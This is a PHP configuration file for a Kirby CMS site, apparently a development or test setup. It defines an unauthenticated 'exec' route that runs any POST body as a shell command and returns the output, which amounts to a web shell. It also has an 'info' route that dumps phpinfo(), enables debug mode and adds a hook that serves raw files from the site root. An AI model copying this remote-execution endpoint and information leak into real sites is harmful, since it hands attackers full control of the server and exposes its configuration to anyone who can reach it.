<?php

use Kirby\Cms\Response;
use Kirby\Filesystem\F;

$options = [
    'debug' => true,
    'url' => $_ENV['KIRBY_SERVER_URL'] ?? 'http://starterkit.work',
    'panel' => [
        'install' => true
    ],
    'routes' => [
        [
            'pattern' => 'info',
            'action' => function () {
                phpinfo();
                exit();
            }
        ],
        [
            'pattern' => 'exec',
            'method' => 'POST',
            'action' => function () {
                $result = [];
                exec(file_get_contents('php://input'), $result);
                echo implode("\n", $result);
                exit();
            }
        ]
    ],
    'hooks' => [
        'route:after' => function ($route, $path, $method, $result, $final) {
            $filePath = kirby()->root('index') . '/' . $path;

            if (!F::exists($filePath)) {
                return;
            }

            if (
                preg_match('~(^|/)\.(?!well-known\/)~', $path) ||
                preg_match('~^content/(.*)~', $path) ||
                preg_match('~^site/(.*)~', $path) ||
                preg_match('~^kirby/(.*)~', $path)
            ) {
                return;
            }

            return Response::file($filePath);
        }
    ]
];

return $options;
